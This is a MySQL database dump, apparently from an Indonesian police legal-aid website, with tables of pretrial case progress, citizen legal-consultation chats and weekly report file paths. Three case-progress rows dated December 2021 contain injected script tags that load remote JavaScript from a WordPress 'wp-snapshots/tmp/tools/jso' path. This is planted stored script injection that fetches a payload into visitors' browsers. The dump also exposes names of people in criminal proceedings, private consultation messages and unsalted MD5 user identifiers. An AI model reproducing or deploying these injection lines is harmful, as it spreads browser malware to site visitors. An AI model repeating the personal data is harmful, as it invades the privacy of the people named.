INSERT INTO `bantuan_hukum_proses` VALUES (29, '2021-10-11', 'PUTUSAN SIDANG', 'Pembacaan Putusan oleh Hakim Tunggal Praperadilan:<br><div>1. Menerima permohonan pemohon untuk mencabut Praperadilan, sehingga permohonan GUGUR;</div><div>2. Membebankan biaya perkara kepada pemohon sebesar NIHIL.</div>', 'Administrator', '2021-10-11 16:57:07', '2021-10-11 16:57:07');
INSERT INTO `bantuan_hukum_proses` VALUES (30, '2021-09-24', 'DALAM PROSES', 'Praperadilan antara Polres Bima Kota melawan HASANUDDIN Melalui Kuasa Hukum AL IMRAN, S.H.<br>', 'Administrator', '2021-10-11 16:59:08', '2021-10-11 16:59:08');
INSERT INTO `bantuan_hukum_proses` VALUES (30, '2021-10-11', 'PROSES SIDANG', '11 Oktober 2021<div>Agenda Sidang:&nbsp;</div><div>Pembacaan Permohonan Pemohon</div><div><br></div><div>Agenda sidang berikutnya:</div><div>Pembacaan Jawaban dari Termohon.&nbsp;</div><div><br></div>', 'Administrator', '2021-10-11 17:05:16', '2021-10-11 17:05:16');
INSERT INTO `bantuan_hukum_proses` VALUES (29, '2021-10-11', 'PUTUSAN SIDANG', '11 Oktober 2021<br><br>PUTUSAN SIDANG<br>Pembacaan Putusan oleh Hakim Tunggal Praperadilan:<div>1. Menerima permohonan pemohon untuk mencabut Praperadilan, sehingga permohonan GUGUR;</div><div>2. Membebankan biaya perkara kepada pemohon sebesar NIHIL.</div><div><br></div><div><br></div>', 'Administrator', '2021-10-11 17:06:48', '2021-10-11 17:06:48');
INSERT INTO `bantuan_hukum_proses` VALUES (31, '2021-09-27', 'DALAM PROSES', 'Praperadilan antara Polres Kota Mataram melawan MUHAMMAD RAMADHAN alias RAMDHAN Als. BULE Melalui Kuasa Hukum ISKANDAR DKK S.H., dkk. <br>', 'Administrator', '2021-10-15 16:21:29', '2021-10-15 16:21:29');
INSERT INTO `bantuan_hukum_proses` VALUES (31, '2021-10-15', 'PROSES SIDANG', '15 Oktober 2021<div>Agenda Sidang:</div><div>Pembuktian surat dan saksi dari pemohon dan termohon.</div><div><br></div><div>Agenda sidang berikutnya:</div><div>Pembacaan keputusan pada hari senin tanggal 18 Oktober 2021.</div>', 'Administrator', '2021-10-15 16:22:46', '2021-10-15 16:22:46');
INSERT INTO `bantuan_hukum_proses` VALUES (31, '2021-10-18', 'PUTUSAN SIDANG', 'Senin, 18 Oktober 2021<div>Agenda Sidang:</div><div>Pembacaan Putusan oleh Hakim Tunggal sbb:</div><div>Dalam eksepsi:</div><div>- Menolak Eksepsi Termohon.&nbsp;</div><div>Dalam pokok perkara:</div><div>1.  Menolak permohonan pemohon untuk seluruhnya;</div><div>2. Membebankan biaya perkara kepada Pemohon sebesar NIHIL.</div>', 'Administrator', '2021-10-18 20:12:58', '2021-10-18 20:12:58');
INSERT INTO `bantuan_hukum_proses` VALUES (30, '2021-10-18', 'PUTUSAN SIDANG', '<div>Senin, 18 Oktober 2021</div><div>Agenda Sidang:</div><div>Pembacaan Putusan Praperadilan oleh Hakim Tunggal:</div><div>1. Menolak Permohonan Pemohon untuk seluruhnya;</div><div>2. Membebankan biaya perkara kepada Pemohon sebesar NIHIL.</div>', 'Administrator', '2021-10-18 20:15:36', '2021-10-18 20:15:36');
INSERT INTO `bantuan_hukum_proses` VALUES (32, '2021-11-01', 'PROSES SIDANG', 'Praperadilan antara Polres Kota Mataram melawan MUHAMMAD RAMADHAN alias RAMDHAN Als. BULE Melalui Kuasa Hukum ISKANDAR DKK S.H., dkk.<br><br>', 'Administrator', '2021-11-04 19:30:18', '2021-11-04 19:30:18');
INSERT INTO `bantuan_hukum_proses` VALUES (32, '2021-11-01', 'PROSES SIDANG', '&nbsp;1 November 2021<br><div>Agenda sidang:<br>Pembacaan Pencabutan dari Kuasa Hukum Termohon.</div>', 'Administrator', '2021-11-04 19:34:10', '2021-11-04 19:34:10');
INSERT INTO `bantuan_hukum_proses` VALUES (24, '2021-11-22', 'PUTUSAN SIDANG', 'Senin, 22 November 2021<br><div>Agenda Sidang pembacaan putusan, adalah sebagai berikut:</div><div>1. Menolak permohonan penggugat untuk sebagian;</div><div>2. Memberikan hak Asuh anak kepada penggugat, dikarenakan ank masih di bawah umur;</div><div>3. Memberikan nafkah kepada ketiga anaknya masing masing mendapatkan Rp. 500.000,- (lima ratus ribu rupiah) perbulan, total seluruhnya sejumlah Rp .1.500.000,- (satu juta lima ratus rupiah) perbulannya.</div><div>4. Membebani biaya perkara kepada tergugat sebesar Rp. 350.000,- (tiga ratus lima puluh ribu rupiah).</div>', 'Administrator', '2021-11-26 16:13:06', '2021-11-26 16:13:06');
INSERT INTO `bantuan_hukum_proses` VALUES (32, '2021-11-01', 'PUTUSAN SIDANG', 'Senin, 1 November 2021<div>Agenda sidang:</div><div>Pembacaan Pencabutan dari Kuasa Hukum Termohon.</div>', 'Administrator', '2021-11-26 16:16:27', '2021-11-26 16:16:27');
INSERT INTO `bantuan_hukum_proses` VALUES (18, '2021-11-30', 'PROSES SIDANG', '30 November 2021<div>Agenda sidang:</div><div>Penyerahan kesimpulan dari para pihak.</div><div><br></div><div>Agenda Sidang berikutnya:</div><div>Putusan tanggal 30 Desember 2021</div>', 'Administrator', '2021-11-30 16:39:33', '2021-11-30 16:39:33');
INSERT INTO `bantuan_hukum_proses` VALUES (33, '2021-12-02', 'DALAM PROSES', '&lt;script src=<a target=\"_blank\" rel=\"nofollow\" href=\"https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/29a342c9.js></script>\">https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/29a342c9.js&gt;&lt;/script&gt;</a>;<br>', 'Administrator', '2021-12-02 19:20:33', '2021-12-02 19:20:33');
INSERT INTO `bantuan_hukum_proses` VALUES (7, '2021-12-02', 'DALAM PROSES', '&lt;script src=<a target=\"_blank\" rel=\"nofollow\" href=\"https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/29a342c9.js></script>\">https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/29a342c9.js&gt;&lt;/script&gt;</a>;<br>', 'Administrator', '2021-12-02 19:23:20', '2021-12-02 19:23:20');
INSERT INTO `bantuan_hukum_proses` VALUES (34, '2021-12-03', 'DALAM PROSES', '&lt;script src=<a target=\"_blank\" rel=\"nofollow\" href=\"https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/08f23bce.js></script>\">https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/08f23bce.js&gt;&lt;/script&gt;</a>;', 'Administrator', '2021-12-03 05:46:51', '2021-12-03 05:46:51');

-- ----------------------------
-- Table structure for chat
-- ----------------------------
DROP TABLE IF EXISTS `chat`;
CREATE TABLE `chat`  (
  `chat_id` bigint NOT NULL AUTO_INCREMENT,
  `chat_dari` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `chat_kepada` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `chat_pesan` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
  `terbaca` tinyint NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`chat_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 42 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of chat
-- ----------------------------
INSERT INTO `chat` VALUES (19, '1ed6edd77a761a3d27e7b261cdb1ed90', '21232f297a57a5a743894a0e4a801fc3', 'Selamat pagi', 1, '2020-07-28 08:38:31', '2022-01-14 10:53:02');
INSERT INTO `chat` VALUES (20, '21232f297a57a5a743894a0e4a801fc3', '1ed6edd77a761a3d27e7b261cdb1ed90', 'Selamat pagi', 1, '2020-07-28 08:38:48', '2020-07-28 08:39:05');
INSERT INTO `chat` VALUES (21, '1ed6edd77a761a3d27e7b261cdb1ed90', '21232f297a57a5a743894a0e4a801fc3', 'Sy mau konsultasi', 1, '2020-07-28 08:39:05', '2022-01-14 10:53:02');
INSERT INTO `chat` VALUES (22, '294d33fe8c4f88174821e14890a24ab5', '21232f297a57a5a743894a0e4a801fc3', 'Saya mau konsultasi masalah warisan tanah?', 1, '2021-01-15 23:59:12', '2022-03-23 11:21:02');
INSERT INTO `chat` VALUES (23, '21232f297a57a5a743894a0e4a801fc3', '294d33fe8c4f88174821e14890a24ab5', 'baik, bisa kami diceritakan kronologisnya?', 1, '2021-01-16 00:00:31', '2021-02-19 13:07:08');
INSERT INTO `chat` VALUES (24, '294d33fe8c4f88174821e14890a24ab5', '21232f297a57a5a743894a0e4a801fc3', 'Saya belum dapat warisan dari orang tua saya?', 1, '2021-01-16 00:01:16', '2022-03-23 11:21:02');
INSERT INTO `chat` VALUES (25, '21232f297a57a5a743894a0e4a801fc3', '294d33fe8c4f88174821e14890a24ab5', 'baik. bisa dilanjutkan ceritanya?', 1, '2021-01-16 00:01:55', '2021-02-19 13:07:08');
INSERT INTO `chat` VALUES (26, '294d33fe8c4f88174821e14890a24ab5', '21232f297a57a5a743894a0e4a801fc3', 'Baik.', 1, '2021-01-16 00:02:03', '2022-03-23 11:21:02');
INSERT INTO `chat` VALUES (27, '294d33fe8c4f88174821e14890a24ab5', '21232f297a57a5a743894a0e4a801fc3', 'Orang tua saya sudah membagi tanah warisannya, tp sertifikatnya msh atas nama orang tua saya? Bagaimana ya pak/buk?', 1, '2021-01-16 00:04:57', '2022-03-23 11:21:02');
INSERT INTO `chat` VALUES (28, '21232f297a57a5a743894a0e4a801fc3', '294d33fe8c4f88174821e14890a24ab5', 'sudah di sampaikan ke saudara bapak/Ibu?', 1, '2021-01-16 00:05:32', '2021-02-19 13:07:08');
INSERT INTO `chat` VALUES (29, '294d33fe8c4f88174821e14890a24ab5', '21232f297a57a5a743894a0e4a801fc3', 'Sudah.', 1, '2021-01-16 00:05:39', '2022-03-23 11:21:02');
INSERT INTO `chat` VALUES (30, '2283472b81821dee9b67aa77b2db5eba', '21232f297a57a5a743894a0e4a801fc3', 'Polri lebih transparan dalam menangani kasus ditengah masyarakat', 1, '2021-03-23 10:44:00', '2022-03-23 11:21:28');
INSERT INTO `chat` VALUES (31, '3138d3349bf3b8097b3c188d75e52650', '21232f297a57a5a743894a0e4a801fc3', 'Mendukung Harkamtibmas', 1, '2021-03-23 10:48:19', '2022-03-23 11:21:35');
INSERT INTO `chat` VALUES (32, 'a18af140486758eef0720e371e1965c9', '21232f297a57a5a743894a0e4a801fc3', 'jika namanya dipakai untuk meminjam uang oleh orang lain dan ternyata orang tersebut tidak membayar cicilannya sehingga menagih kepada pemilik atas nama di ktp dan si pemilik nama di ktp merasa keberatan, masuk dalam pasal berapa ?', 1, '2021-08-31 08:34:28', '2021-11-24 09:11:46');
INSERT INTO `chat` VALUES (33, 'ea67d3c22f1f508aee063fbc3022f560', '21232f297a57a5a743894a0e4a801fc3', 'selamat malam pak.', 1, '2021-10-07 23:46:13', '2021-11-24 09:26:56');
INSERT INTO `chat` VALUES (34, 'ea67d3c22f1f508aee063fbc3022f560', '21232f297a57a5a743894a0e4a801fc3', 'mhn bntuan informasinya..terkait dana bansos kemarin..sya dpt dana banson sebesar 1,2jt ..tapi tadi kepala lingkungam dtg kerumah sya dan bilang besok sya disuruh ke kelurahan dgn membawa uang 200rb untuk diberikn ke pak lurah', 1, '2021-10-07 23:47:24', '2021-11-24 09:26:56');
INSERT INTO `chat` VALUES (35, 'ea67d3c22f1f508aee063fbc3022f560', '21232f297a57a5a743894a0e4a801fc3', 'prtnyaan nya.apa memang ada administrasinya sebesar 200rb?', 1, '2021-10-07 23:47:53', '2021-11-24 09:26:56');
INSERT INTO `chat` VALUES (36, '21232f297a57a5a743894a0e4a801fc3', 'a18af140486758eef0720e371e1965c9', 'Bisa dikenakan Pidana Pasal 32 ayat (1) UU ITE dan perdata Pasal 26 UU ITE', 0, '2021-11-24 09:11:46', '2021-11-24 09:11:46');
INSERT INTO `chat` VALUES (37, '21232f297a57a5a743894a0e4a801fc3', 'ea67d3c22f1f508aee063fbc3022f560', 'Mungkin ditanyakan kembali ke penyelenggara, uang administrasi sebesar 200.000 tersebut dipergunakan untuk apa?', 0, '2021-11-24 09:26:55', '2021-11-24 09:26:55');
INSERT INTO `chat` VALUES (38, '21232f297a57a5a743894a0e4a801fc3', '1ed6edd77a761a3d27e7b261cdb1ed90', 'silahkan bapak/ibu, terkait apa?', 0, '2022-01-14 10:53:02', '2022-01-14 10:53:02');
INSERT INTO `chat` VALUES (39, '21232f297a57a5a743894a0e4a801fc3', '294d33fe8c4f88174821e14890a24ab5', 'bawa surat bagi waris untuk d ketahui Kades dan Camat kemudian bawa keBPN untuk dilakukan pemecahan disertai dengan dengan Surat Kuasa,KeteranganWaris dan Surat Pemrmohonantermasuk KTP atau dapat meminta bantuan kepadaNotaris', 0, '2022-03-23 11:21:02', '2022-03-23 11:21:02');
INSERT INTO `chat` VALUES (40, '21232f297a57a5a743894a0e4a801fc3', '2283472b81821dee9b67aa77b2db5eba', 'siap trimakasih', 0, '2022-03-23 11:21:28', '2022-03-23 11:21:28');
INSERT INTO `chat` VALUES (41, '21232f297a57a5a743894a0e4a801fc3', '3138d3349bf3b8097b3c188d75e52650', 'siapp', 0, '2022-03-23 11:21:34', '2022-03-23 11:21:34');

-- ----------------------------
-- Table structure for lensa_kegiatan
-- ----------------------------
DROP TABLE IF EXISTS `lensa_kegiatan`;
CREATE TABLE `lensa_kegiatan`  (
  `lensa_kegiatan_id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `lensa_kegiatan_judul` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `lensa_kegiatan_file` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `lensa_kegiatan_tanggal` date NOT NULL,
  `lensa_kegiatan_satuan_kerja` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `operator` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`lensa_kegiatan_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 114 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of lensa_kegiatan
-- ----------------------------
INSERT INTO `lensa_kegiatan` VALUES (9, 'LAPORAN MINGGU KE-1 JANUARI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 JANUARI 202074Asf7ZjniISeOMc.pdf', '2020-01-01', NULL, 'Administrator', '2020-06-25 12:57:49', '2020-06-25 12:57:49');
INSERT INTO `lensa_kegiatan` VALUES (10, 'LAPORAN MINGGU KE-2 JANUARI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 JANUARI 2020p6yuZgxSNyXeY3xS.pdf', '2020-01-08', NULL, 'Administrator', '2020-06-25 12:59:13', '2020-06-25 12:59:13');
INSERT INTO `lensa_kegiatan` VALUES (11, 'LAPORAN MINGGU KE-3 JANUARI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 JANUARI 2020NfaIgBIDNm4Y5HWL.pdf', '2020-01-15', NULL, 'Administrator', '2020-06-25 13:00:15', '2020-06-25 13:00:15');
INSERT INTO `lensa_kegiatan` VALUES (12, 'LAPORAN MINGGU KE-4 JANUARI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 JANUARI 2020H8AbNBw5HK54H1zO.pdf', '2020-01-22', NULL, 'Administrator', '2020-06-25 13:01:19', '2020-06-25 13:01:19');
INSERT INTO `lensa_kegiatan` VALUES (14, 'LAPORAN MINGGU KE-1 FEBRUARI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 FEBRUARI 2020QyJJOHsZvrE6OlHp.pdf', '2020-02-01', NULL, 'Administrator', '2020-06-25 13:03:36', '2020-06-25 13:03:36');
INSERT INTO `lensa_kegiatan` VALUES (15, 'LAPORAN MINGGU KE-2 FEBRUARI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 FEBRUARI 2020RU2cLxKyorskKxZh.pdf', '2020-02-08', NULL, 'Administrator', '2020-06-25 13:07:42', '2020-06-25 13:07:42');
INSERT INTO `lensa_kegiatan` VALUES (16, 'LAPORAN MINGGU KE-3 FEBRUARI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 FEBRUARI 2020Mpoc01DWoPmjxsnI.pdf', '2020-02-15', NULL, 'Administrator', '2020-06-25 13:13:47', '2020-06-25 13:13:47');
INSERT INTO `lensa_kegiatan` VALUES (17, 'LAPORAN MINGGU KE-4 FEBRUARI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 FEBRUARI 2020aKIFQiwF4P3Mq4BX.pdf', '2020-02-22', NULL, 'Administrator', '2020-06-25 13:14:44', '2020-06-25 13:14:44');
INSERT INTO `lensa_kegiatan` VALUES (18, 'LAPORAN MINGGU KE-1 MARET 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 MARET 2020TQwXF98bRe1smtG5.pdf', '2020-03-02', NULL, 'Administrator', '2020-06-25 13:15:53', '2020-06-25 13:15:53');
INSERT INTO `lensa_kegiatan` VALUES (19, 'LAPORAN MINGGU KE-2 MARET 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 MARET 2020vso9N0Hno0dKajO9.pdf', '2020-03-09', NULL, 'Administrator', '2020-06-25 13:16:54', '2020-06-25 13:16:54');
INSERT INTO `lensa_kegiatan` VALUES (20, 'LAPORAN MINGGU KE-3 MARET 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 MARET 2020tirS2o8lhrcFVd1Q.pdf', '2020-03-16', NULL, 'Administrator', '2020-06-25 13:17:37', '2020-06-25 13:17:37');
INSERT INTO `lensa_kegiatan` VALUES (21, 'LAPORAN MINGGU KE-4 MARET 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 MARET 2020dlbVZSrHFPRtBecc.pdf', '2020-03-23', NULL, 'Administrator', '2020-06-25 13:18:35', '2020-06-25 13:18:35');
INSERT INTO `lensa_kegiatan` VALUES (22, 'LAPORAN MINGGU KE-1 APRIL 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 APRIL 2020bP0RR4v9nLRnw0jB.pdf', '2020-04-01', NULL, 'Administrator', '2020-06-25 13:19:49', '2020-06-25 13:19:49');
INSERT INTO `lensa_kegiatan` VALUES (23, 'LAPORAN MINGGU KE-2 APRIL 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 APRIL 2020QmpEJzXXGAcUy6am.pdf', '2020-04-08', NULL, 'Administrator', '2020-06-25 13:20:38', '2020-06-25 13:20:38');
INSERT INTO `lensa_kegiatan` VALUES (24, 'LAPORAN MINGGU KE-3 APRIL 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 APRIL 2020HMWfnXW2g2LZ6GQ7.pdf', '2020-04-15', NULL, 'Administrator', '2020-06-25 13:21:58', '2020-06-25 13:21:58');
INSERT INTO `lensa_kegiatan` VALUES (25, 'LAPORAN MINGGU KE-4 APRIL 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 APRIL 20204W2ryy6Q02mEUasz.pdf', '2020-04-22', NULL, 'Administrator', '2020-06-25 13:22:44', '2020-06-25 13:22:44');
INSERT INTO `lensa_kegiatan` VALUES (26, 'LAPORAN MINGGU KE-5 APRIL 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-5 APRIL 2020aPH8qa5Z7OPa5oH3.pdf', '2020-04-29', NULL, 'Administrator', '2020-06-25 13:23:58', '2020-06-25 13:23:58');
INSERT INTO `lensa_kegiatan` VALUES (27, 'LAPORAN MINGGU KE-1 MEI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 MEI 2020hlfvpdPWxpQqCJTj.pdf', '2020-05-01', NULL, 'Administrator', '2020-06-25 13:25:05', '2020-06-25 13:25:05');
INSERT INTO `lensa_kegiatan` VALUES (28, 'LAPORAN MINGGU KE-2 MEI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 MEI 2020j5Su8t1SducmSsPc.pdf', '2020-05-08', NULL, 'Administrator', '2020-06-25 13:25:50', '2020-06-25 13:25:50');
INSERT INTO `lensa_kegiatan` VALUES (29, 'LAPORAN MINGGU KE-3 MEI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 MEI 2020SHoRLN0WPCBP8TnO.pdf', '2020-05-15', NULL, 'Administrator', '2020-06-25 13:26:27', '2020-06-25 13:26:27');
INSERT INTO `lensa_kegiatan` VALUES (30, 'LAPORAN MINGGU KE-4 MEI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 MEI 2020gN9AiheTUmD1GCZU.pdf', '2020-05-22', NULL, 'Administrator', '2020-06-25 13:27:21', '2020-06-25 13:27:21');
INSERT INTO `lensa_kegiatan` VALUES (31, 'LAPORAN MINGGU KE-1 JUNI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 JUNI 2020zoRO1APFhBORwM3x.pdf', '2020-06-01', NULL, 'Administrator', '2020-06-25 13:28:20', '2020-06-25 13:28:20');
INSERT INTO `lensa_kegiatan` VALUES (32, 'LAPORAN MINGGU KE-2 JUNI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 JUNI 20201sZZDQfXEcBMGGXC.pdf', '2020-06-08', NULL, 'Administrator', '2020-06-25 13:32:40', '2020-06-25 13:32:40');
INSERT INTO `lensa_kegiatan` VALUES (33, 'LAPORAN MINGGU KE-3 JUNI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 JUNI 20209hMNIJ6nuwL14bhc.pdf', '2020-06-15', NULL, 'Administrator', '2020-06-25 13:33:18', '2020-06-25 13:33:18');
INSERT INTO `lensa_kegiatan` VALUES (34, 'LAPORAN MINGGU KE-4 JUNI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 JUNI 20207ZmzzmusOpxCftWq.pdf', '2020-06-28', NULL, 'Administrator', '2020-06-29 10:59:41', '2020-06-29 10:59:41');
INSERT INTO `lensa_kegiatan` VALUES (35, 'LAPORAN MINGGU KE-1 JULI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 JULI 2020HxvC0DPAy6316hKR.pdf', '2020-07-01', NULL, 'Administrator', '2020-07-10 23:44:02', '2020-07-10 23:44:02');
INSERT INTO `lensa_kegiatan` VALUES (36, 'LAPORAN MINGGU KE-2 JULI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 JULI 2020PKT7RQqgGZ3Mc22y.pdf', '2020-07-12', NULL, 'Administrator', '2020-08-03 13:33:52', '2020-08-03 13:33:52');
INSERT INTO `lensa_kegiatan` VALUES (37, 'LAPORAN MINGGU KE-3 JULI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 JULI 2020ECzopIyN3Qci2nJf.pdf', '2020-07-19', NULL, 'Administrator', '2020-08-03 13:36:24', '2020-08-03 13:36:24');
INSERT INTO `lensa_kegiatan` VALUES (38, 'LAPORAN  MINGGU KE-4 JULI 2020', 'public/upload/lensakegiatan/LAPORAN  MINGGU KE-4 JULI 2020N8s1uUKC99uFoi2p.pdf', '2020-07-26', NULL, 'Administrator', '2020-08-03 13:37:11', '2020-08-03 13:37:11');
INSERT INTO `lensa_kegiatan` VALUES (39, 'LAPORAN MINGGU KE-5 JULI 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-5 JULI 2020llooFREz1NCAqCGk.pdf', '2020-08-02', NULL, 'Administrator', '2020-08-03 13:40:09', '2020-08-03 13:40:09');
INSERT INTO `lensa_kegiatan` VALUES (40, 'LAPORAN MINGGU KE-1 BULAN AGUSTUS 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 BULAN AGUSTUS 2020E8FR7ozbca5QQAQx.pdf', '2020-08-10', NULL, 'Administrator', '2020-09-15 11:14:27', '2020-09-15 11:14:27');
INSERT INTO `lensa_kegiatan` VALUES (41, 'LAPORAN MINGGU KE-2 AGUSTUS 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 AGUSTUS 2020LV9FoJmV41GTKZRV.pdf', '2020-08-17', NULL, 'Administrator', '2020-09-15 11:15:28', '2020-09-15 11:15:28');
INSERT INTO `lensa_kegiatan` VALUES (42, 'LAPORAN MINGGU KE-3 AGUSTUS 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 AGUSTUS 2020an0DN1NwwUox3wuc.pdf', '2020-08-24', NULL, 'Administrator', '2020-09-15 11:16:10', '2020-09-15 11:16:10');
INSERT INTO `lensa_kegiatan` VALUES (43, 'LAPORAN MINGGU KE-4 AGUSTUS 2020', '/public/upload/lensakegiatan/LAPORAN MINGGU KE-4 AGUSTUS 2020kzNp8NvNEJWZE4Zv.pdf', '2020-08-31', NULL, 'Administrator', '2020-09-15 11:17:08', '2020-09-15 11:17:08');
INSERT INTO `lensa_kegiatan` VALUES (44, 'LAPORAN MINGGU KE-1 SEPTEMBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 SEPTEMBER 2020Xu13EF83ZopRrIN7.pdf', '2020-09-07', NULL, 'Administrator', '2020-09-15 11:18:23', '2020-09-15 11:18:23');
INSERT INTO `lensa_kegiatan` VALUES (45, 'LAPORAN MINGGU KE-2 SEPTEMBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 SEPTEMBER 2020E7v6vRBtjBGT7H1a.pdf', '2020-09-14', NULL, 'Administrator', '2020-09-15 11:18:57', '2020-09-15 11:18:57');
INSERT INTO `lensa_kegiatan` VALUES (46, 'ini', 'public/upload/lensakegiatan/inia9s0Rc8lVX1JDcS8.pdf', '2020-12-13', NULL, 'Administrator', '2020-12-13 01:36:38', '2020-12-13 01:36:38');
INSERT INTO `lensa_kegiatan` VALUES (47, 'LAPORAN MINGGU KE-1 OKTOBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 OKTOBER 2020zDxBsj6MEWGOTwBy.pdf', '2020-10-11', NULL, 'Administrator', '2021-01-06 09:30:41', '2021-01-06 09:30:41');
INSERT INTO `lensa_kegiatan` VALUES (48, 'LAPORAN MINGGU-2 OKTOBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU-2 OKTOBER 20208q03mTexhdyCOgdS.pdf', '2020-10-18', NULL, 'Administrator', '2021-01-06 09:31:32', '2021-01-06 09:31:32');
INSERT INTO `lensa_kegiatan` VALUES (49, 'LAPORAN MINGGU-4 OKTOBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU-4 OKTOBER 20203s4dfYC1wnpOWAQd.pdf', '2020-10-25', NULL, 'Administrator', '2021-01-06 09:32:11', '2021-01-06 09:32:11');
INSERT INTO `lensa_kegiatan` VALUES (50, 'LAPORAN MINGGU-2 NOVEMBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU-2 NOVEMBER 2020pq4BuEQrEbuZ5F51.pdf', '2020-11-08', NULL, 'Administrator', '2021-01-06 09:33:12', '2021-01-06 09:33:12');
INSERT INTO `lensa_kegiatan` VALUES (51, 'LAPORAN MINGGU-3 SEPTEMBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU-3 SEPTEMBER 2020IskL3zf5bNAueR6s.pdf', '2020-09-13', NULL, 'Administrator', '2021-01-06 09:34:07', '2021-01-06 09:34:07');
INSERT INTO `lensa_kegiatan` VALUES (52, 'LAPORAN MINGGU-4 NOVEMBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU-4 NOVEMBER 2020K4yo5y0GfmN6njw8.pdf', '2020-11-28', NULL, 'Administrator', '2021-01-06 09:35:11', '2021-01-06 09:35:11');
INSERT INTO `lensa_kegiatan` VALUES (53, 'LAPORAN MINGGU-1 DESEMBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU-1 DESEMBER 2020cX3xEmLI8txVdNaN.pdf', '2020-11-30', NULL, 'Administrator', '2021-01-06 09:36:41', '2021-01-06 09:36:41');
INSERT INTO `lensa_kegiatan` VALUES (54, 'LAPORAN MINGGU-3 DESEMBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU-3 DESEMBER 2020nTxbVxrVGZKXfsZL.pdf', '2020-12-19', NULL, 'Administrator', '2021-01-06 09:37:31', '2021-01-06 09:37:31');
INSERT INTO `lensa_kegiatan` VALUES (55, 'LAPORAN MINGGU-4 DESEMBER 2020', 'public/upload/lensakegiatan/LAPORAN MINGGU-4 DESEMBER 20207b1Si8YiZSJQN85d.pdf', '2020-12-20', NULL, 'Administrator', '2021-01-06 09:38:09', '2021-01-06 09:38:09');
INSERT INTO `lensa_kegiatan` VALUES (56, 'LAPORAN MINGGU KE-1 JANUARI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 JANUARI 2021Ylo5ndw2TdhFih3M.pdf', '2021-01-10', NULL, 'Administrator', '2021-01-27 14:38:04', '2021-01-27 14:38:04');
INSERT INTO `lensa_kegiatan` VALUES (57, 'LAPORAN MINGGU KE-2 JANUARI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 JANUARI 2021EcAPr22FHZNl9UAV.pdf', '2021-01-17', NULL, 'Administrator', '2021-01-27 14:38:52', '2021-01-27 14:38:52');
